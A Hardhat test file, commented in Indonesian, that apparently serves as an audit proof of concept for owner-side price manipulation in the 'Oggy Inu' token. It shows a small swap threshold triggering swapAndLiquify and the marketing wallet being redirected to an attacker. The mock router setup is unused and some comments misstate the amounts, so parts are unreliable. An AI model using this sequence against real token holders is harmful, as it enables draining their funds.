const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Oggy Inu Price Manipulation PoC", function () {
  let OggyInu, oggy, owner, user, attacker, mockRouter;

  // Mock Router sederhana untuk simulasi
  const MockRouter = {
    factory: () => ethers.constants.AddressZero,
    WETH: () => "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", // Alamat WETH dummy
    addLiquidityETH: async () => [ethers.utils.parseUnits("1000", 9), ethers.utils.parseEther("1"), ethers.utils.parseEther("1")],
    swapExactTokensForETHSupportingFeeOnTransferTokens: async () => {}
  };

  beforeEach(async function () {
    [owner, user, attacker] = await ethers.getSigners();

    // Deploy kontrak dengan mock router
    const OggyInu = await ethers.getContractFactory("OGGY");
    oggy = await OggyInu.deploy(owner.address); // Gunakan owner sebagai router sementara
    await oggy.deployed();

    // Mock router behavior
    mockRouter = await ethers.getContractAt("OGGY", oggy.address); // Simulasi router dengan kontrak
  });

  it("should allow owner to manipulate price via small swapTokensAtAmount", async function () {
    // Aktifkan trading
    await oggy.connect(owner).EnableTrading();
    expect(await oggy.tradingEnabled()).to.be.true;
    expect(await oggy.swapEnabled()).to.be.true;

    // Tambahkan likuiditas awal (simulasi)
    const tokenAmount = ethers.utils.parseUnits("1000000", 9); // 1 juta token
    const bnbAmount = ethers.utils.parseEther("1");
    await oggy.connect(owner).approve(oggy.address, tokenAmount);
    await oggy.connect(owner).addLiquidity(tokenAmount, bnbAmount, { value: bnbAmount });

    // Cek saldo awal
    const ownerBalanceBefore = await oggy.balanceOf(owner.address);
    console.log("Owner Balance Before:", ethers.utils.formatUnits(ownerBalanceBefore, 9), "OGGY");

    // Turunkan swapTokensAtAmount
    await oggy.connect(owner).updateSwapTokensAtAmount(1); // 1 * 10^9 = 1 miliar token
    expect(await oggy.swapTokensAtAmount()).to.equal(ethers.utils.parseUnits("1", 9));

    // Transfer kecil untuk memicu swapAndLiquify
    const transferAmount = ethers.utils.parseUnits("2000", 9); // 2 miliar token
    await oggy.connect(owner).transfer(user.address, transferAmount);

    // Ubah marketingWallet ke dompet attacker
    await oggy.connect(owner).updateMarketingWallet(attacker.address);

    // Cek saldo setelah eksploitasi
    const contractBalance = await oggy.balanceOf(oggy.address);
    const attackerBalance = await ethers.provider.getBalance(attacker.address);
    const pairBalance = await oggy.balanceOf(await oggy.pair());

    console.log("Contract Balance:", ethers.utils.formatUnits(contractBalance, 9), "OGGY");
    console.log("Attacker BNB Balance:", ethers.utils.formatEther(attackerBalance));
    console.log("Pair Balance:", ethers.utils.formatUnits(pairBalance, 9), "OGGY");

    // Verifikasi bahwa swapAndLiquify dipicu
    expect(contractBalance).to.be.above(0); // Token pajak terkumpul di kontrak
    expect(pairBalance).to.be.above(0); // Likuiditas bertambah di pair
  });
});
